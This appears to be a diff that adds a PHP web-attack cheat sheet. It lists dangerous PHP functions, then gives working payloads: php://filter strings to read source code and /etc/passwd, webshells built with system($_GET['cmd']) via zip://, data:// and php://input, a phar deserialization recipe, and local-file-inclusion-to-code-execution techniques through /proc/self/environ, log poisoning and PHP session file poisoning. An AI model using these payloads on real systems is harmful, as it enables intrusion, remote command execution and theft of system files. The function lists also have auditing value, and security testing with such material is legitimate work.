@@ -1,0 +1,306 @@
+PHP
+
+Vulnerable functions
+Local/Remote file inclusion:
+include()
+include_once()
+require()
+require_once()
+
+Local/Remote command execution:
+eval()
+assert()
+preg_replace()
+fwrite()
+passthru()
+file_get_contents()
+shell_exec()
+system()
+create_function()
+include()
+include_once()
+require()
+require_once()
+``
+exec()
+popen()
+pcntl_exec()
+proc_open()
+url_exec()
+escapeshellarg()
+escapeshellcmd()
+ini_restore()
+apache_setenv()
+pclose()
+proc_close()
+proc_get_status()
+proc_nice()
+syslog()
+
+SQL Injection:
+mysql_query()
+
+File/File system:
+fopen()
+readfile()
+glob()
+file()
+popen()
+exec()
+
+List of Functions which accept callbacks
+Function                     => Position of callback arguments
+'ob_start'                   =>  0,
+'array_diff_uassoc'          => -1,
+'array_diff_ukey'            => -1,
+'array_filter'               =>  1,
+'array_intersect_uassoc'     => -1,
+'array_intersect_ukey'       => -1,
+'array_map'                  =>  0,
+'array_reduce'               =>  1,
+'array_udiff_assoc'          => -1,
+'array_udiff_uassoc'         => array(-1, -2),
+'array_udiff'                => -1,
+'array_uintersect_assoc'     => -1,
+'array_uintersect_uassoc'    => array(-1, -2),
+'array_uintersect'           => -1,
+'array_walk_recursive'       =>  1,
+'array_walk'                 =>  1,
+'assert_options'             =>  1,
+'uasort'                     =>  1,
+'uksort'                     =>  1,
+'usort'                      =>  1,
+'preg_replace_callback'      =>  1,
+'spl_autoload_register'      =>  0,
+'iterator_apply'             =>  1,
+'call_user_func'             =>  0,
+'call_user_func_array'       =>  0,
+'register_shutdown_function' =>  0,
+'register_tick_function'     =>  0,
+'set_error_handler'          =>  0,
+'set_exception_handler'      =>  0,
+'session_set_save_handler'   => array(0, 1, 2, 3, 4, 5),
+'sqlite_create_aggregate'    => array(2, 3),
+'sqlite_create_function'     =>  2
+
+Information Disclosure:
+phpinfo
+posix_mkfifo
+posix_getlogin
+posix_ttyname
+getenv
+get_current_user
+proc_get_status
+get_cfg_var
+disk_free_space
+disk_total_space
+diskfreespace
+getcwd
+getlastmo
+getmygid
+getmyinode
+getmypid
+getmyuid
+
+Filesystem Functions:
+// open filesystem handler
+fopen
+tmpfile
+bzopen
+gzopen
+SplFileObject->__construct
+// write to filesystem (partially in combination with reading)
+chgrp
+chmod
+chown
+copy
+file_put_contents
+lchgrp
+lchown
+link
+mkdir
+move_uploaded_file
+rename
+rmdir
+symlink
+tempnam
+touch
+unlink
+imagepng   - 2nd parameter is a path.
+imagewbmp  - 2nd parameter is a path. 
+image2wbmp - 2nd parameter is a path. 
+imagejpeg  - 2nd parameter is a path.
+imagexbm   - 2nd parameter is a path.
+imagegif   - 2nd parameter is a path.
+imagegd    - 2nd parameter is a path.
+imagegd2   - 2nd parameter is a path.
+iptcembed
+ftp_get
+ftp_nb_get
+// read from filesystem
+file_exists
+file_get_contents
+file
+fileatime
+filectime
+filegroup
+fileinode
+filemtime
+fileowner
+fileperms
+filesize
+filetype
+glob
+is_dir
+is_executable
+is_file
+is_link
+is_readable
+is_uploaded_file
+is_writable
+is_writeable
+linkinfo
+lstat
+parse_ini_file
+pathinfo
+readfile
+readlink
+realpath
+stat
+gzfile
+readgzfile
+getimagesize
+imagecreatefromgif
+imagecreatefromjpeg
+imagecreatefrompng
+imagecreatefromwbmp
+imagecreatefromxbm
+imagecreatefromxpm
+ftp_put
+ftp_nb_put
+exif_read_data
+read_exif_data
+exif_thumbnail
+exif_imagetype
+hash_file
+hash_hmac_file
+hash_update_file
+md5_file
+sha1_file
+highlight_file
+show_source
+php_strip_whitespace
+get_meta_tags
+
+Other potential vuln functions:
+extract - Opens the door for register_globals attacks (see study in scarlet).
+parse_str -  works like extract if only one argument is given.  
+putenv
+ini_set
+mail - has CRLF injection in the 3rd parameter, opens the door for spam. 
+header - on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area. 
+proc_nice
+proc_terminate
+proc_close
+pfsockopen
+fsockopen
+apache_child_terminate
+posix_kill
+posix_mkfifo
+posix_setpgid
+posix_setsid
+posix_setuid
+unserialize
+str_repeat
+register_tick_function
+register_shutdown_function
+
+GLOBAL VARIABLES
+$_SERVER
+$_GET
+$_POST
+$_FILE
+$_COOKIE
+
+WRAPPERS
+php://filter
+=php://filter/read=string.rot13/resource=index.php
+=php://filter/convert.base64-encode/resource=index.php
+=pHp://FilTer/convert.base64-encode/resource=index.php
+=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+=php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s
+zip://
+echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;
+mv payload.zip shell.jpg;
+rm payload.php
+zip://shell.jpg%23payload.php
+data://
+=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+"<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
+expect://
+=expect://id
+=expect://ls
+input://
+=php://input
+POST: <?php system('id'); ?>
+phar://
+// create new Phar
+$phar = new Phar('test.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ? >');
+// add object of any class as meta data
+class AnyClass {}
+$object = new AnyClass;
+$object->data = 'rips';
+$phar->setMetadata($object);
+$phar->stopBuffering();
+class AnyClass {
+    function __destruct() {
+        echo $this->data;
+    }
+}
+// output: rips
+include('phar://test.phar');
+// If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked
+// NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, file_exists and many more.
+
+LFI TO RCE
+/proc/*/fd
+>repeatedly upload shell
+=/proc/$PID/fd/$FD //with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)
+=/proc/666/fd/1151
+
+/proc/self/environ
+=../../../proc/self/environ
+User-Agent: <?=phpinfo(); ?>
+
+file metadata upload
+=path/to/uploaded/file.png
+e.g. location: <?php system($_GET['c']); ?>
+
+phpinfo()
+https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+https://www.insomniasec.com/downloads/publications/phpinfolfi.py
+
+log poisoning
+=/var/log/apache/access.log
+=/var/log/apache/error.log
+=/var/log/vsftpd.log
+=/var/log/sshd.log
+=/var/log/mail
+=/var/log/httpd/error_log
+=/usr/local/apache/log/error_log
+=/usr/local/apache2/log/error_log
+
+PHP Sessions (PHPSESSID)
+Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
+Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
+/var/lib/php5/sess_[PHPSESSID]
+/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
+user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
+*set cookie <?php system('cat /etc/passwd');?>
+e.g. login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
+Exploit LFI to include PHP session file =/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+
